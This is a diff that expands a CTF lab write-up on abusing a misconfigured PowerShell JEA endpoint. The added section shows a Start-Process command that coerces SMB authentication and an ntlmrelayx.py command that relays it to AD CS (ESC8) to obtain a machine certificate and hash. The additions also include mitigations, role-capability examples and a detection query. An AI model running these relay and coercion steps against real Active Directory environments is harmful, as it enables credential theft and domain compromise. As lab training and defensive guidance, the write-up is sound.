@@ -59,12 +59,28 @@ In this writeup, I'll be covering the solve path for Flag 8 - which involved byp
 <li><a href="#resource-based-constrained-delegation">Resource-Based Constrained Delegation</a></li>
 </ul>
 </li>
+<li><a href="#method-3-smb-relay-to-esc8">Method 3: SMB Relay to ESC8</a>
+<ul>
+<li><a href="#sending-smb-authentication">Sending SMB Authentication</a></li>
+<li><a href="#relaying-to-esc8">Relaying to ESC8</a></li>
 </ul>
+</li>
+</ul>
+</li>
+<li>
+<a href="#mitigations--detections">Mitigations & Detections</a>
+<ul>
+<li><a href="#regularly-review-role-capabilities">Regularly Review Role Capabilities</a></li>
+<li><a href="#monitoring-virtual-accounts">Monitoring Virtual Accounts</a></li>
+<li><a href="#auditing">Auditing</a></li>
+</ul>
+</li>
+<li>
+<a href="#conclusion">Conclusion</a>
 </li>
 </ol>
 </div>
 </div>
-<br>
 
 ## Introduction and Scenario
 
@@ -407,7 +423,7 @@ The `shell->run()` method will attempt to execute a command, but of course `Invo
 
 ### Using `pypsrp` Directly
 
-Although the [pspysrp](https://github.com/jborean93/pypsrp) exposes the `execute_ps()` method, you can simply import the underlying classes (`WSMan`, `RunspacePool` and `PowerShell`) to create your own pseudo-shell that doesn't add any fluff.
+Although the [pypysrp](https://github.com/jborean93/pypsrp) exposes the `execute_ps()` method, you can simply import the underlying classes (`WSMan`, `RunspacePool` and `PowerShell`) to create your own pseudo-shell that doesn't add any fluff.
 
 ```python
 from pypsrp.wsman import WSMan
@@ -567,7 +583,7 @@ MAQ         10.3.20.31      389    PALACE-DC        [*] Getting the MachineAccou
 MAQ         10.3.20.31      389    PALACE-DC        MachineAccountQuota: 10
 ```
 
-We can use now create a new machine account `GATARI$` with the password `P@ssw0rd`:
+We can now create a new machine account `GATARI$` with the password `P@ssw0rd`:
 
 ```
 ┌──(kali㉿kali)-[~/sincon]
@@ -627,4 +643,81 @@ We can then use the `ccache` file to authenticate to `PORTICUS`, and list shares
 
 ### Method 3: SMB Relay to ESC8
 
-With reference to the first writeup, we can also relay the `SMB` authentication to `ESC8` using the same method as before. This is particularly useful if you don't have access to a primitive to send HTTP authentication, such as `Invoke-WebRequest`.
+With reference to the [first writeup](https://blog.async.sg/sincon-2025-adcs-relay.html), we can also relay the `SMB` authentication to `ESC8` using the same method as before. This is particularly useful if you don't have access to a primitive to send HTTP authentication, such as `Invoke-WebRequest`.
+
+#### Sending SMB Authentication
+
+An SMB share path can be specified in the `-FilePath` parameter to send SMB authentication to the share:
+
+```
+[doros_archivon@porticus.jess.kingdom] PS> Start-Process -FilePath "\\TABULARIUM.jess.kingdom\gatari$" -Wait
+```
+
+Any other commandlet can be used, such as `-FilePath cmd.exe -ArgumentList net view ...` to enumerate the shares on `TABULARIUM` - which also sends the SMB authentication to `TABULARIUM` but spawns a `cmd.exe`.
+
+#### Relaying to ESC8
+
+We can then relay the SMB authentication to `ESC8` using `ntlmrelayx.py`:
+
+```
+ntlmrelayx.py -t 'http://palace-dc.jess.kingdom/certsrv/certfnsh.asp' -smb2support --adcs --template 'Machine' --no-http-server
+```
+
+![](./assets/img/sincon-2/f345fe5a78c540612cceb3a0a2635e3d.png)
+
+Then, we can exchange the acquired certificate for the NTLM hash of `PORTICUS`:
+
+![](./assets/img/sincon-2/56d6fcc4e5c4cf05746764eccc1cd4d7.png)
+
+From here, there are lots of ways to compromise fully `PORTICUS`.
+
+## Mitigations & Detections
+
+While JEA does open up a lot of attack vectors, it is important to note that it is not inherently insecure. The security of JEA depends on the configuration and the role capabilities defined in the role capability files.
+
+Aside from the [security considerations mentioned by Microsoft](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.5), you may also find that implementing the following mitigations and detections can help to reduce the attack surface of JEA. 
+
+### Regularly Review Role Capabilities
+
+In this writeup, the `Start-Process` commandlet was allowed on the JEA endpoint. While this was an exaggeration to demonstrate the attack vector, it is important to note that seemingly harmless commandlets such as `Get-Service` can be used to send SMB authentication to other machines, which can then be relayed to other machines in the domain.
+
+If you ever have a purpose for these dangerous commandlets, it's highly recommended to restrict the parameters that can be used with them. For example, you can restrict the `Start-Process` commandlet to only allow the user to run an executable at `C:\Projects\HealthCheck.exe`.
+
+```powershell
+@{
+    Name       = 'Start-Process'
+    Parameters = @{ Name = 'FilePath'; ValidateSet = @('C:\Projects\HealthCheck.exe') }
+}
+```
+
+### Monitoring Virtual Accounts
+
+As mentioned earlier, these virtual accounts associated with JEA commands are not meant to be used for extended periods of time. It is also important to be conscious of what commands are allowed to be run by these virtual accounts.
+
+For example, if the following role capability file is registered. It is highly unlikely for any process to be owned by `winrm virtual users\winrm va_x_computername_username`.
+
+```powershell
+@{
+    Name       = 'Start-Process'
+    Parameters = @{ Name = 'FilePath'; ValidateSet = @('C:\Projects\HealthCheck.exe') }
+}
+```
+
+Detection and monitoring capabilities can then be used to alert on any processes that are owned by these virtual accounts, as they are not meant to be used for extended periods of time.
+
+```sql
+event.code: "1" and winlog.user.name: "winrm va_*" and not process.name: ("HealthCheck.exe" or "wsmprovhost.exe")
+```
+
+### Auditing
+
+JEA also has built-in auditing capabilities that can be enabled to log all commands executed in a JEA session. This can be done by setting the `TranscriptDirectory` parameter in the session registration. 
+
+More information can be found: [here](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/audit-and-report?view=powershell-7.5)
+
+
+## Conclusion
+
+While JEA is a powerful tool for restricting administrative access, it can also lead to unintended consequences if not properly configured. For example, the `JESS\Doros_ARCHIVON` user is not a local administrator on `PORTICUS`, but the JEA session allows it to execute commands as a local administrator, which opened up the possibility for privilege escalation.
+
+A lot of work went into building this lab, but it was worth it - many participants got hands-on experience with JEA for the first time, and that exposure could be useful during future engagements.
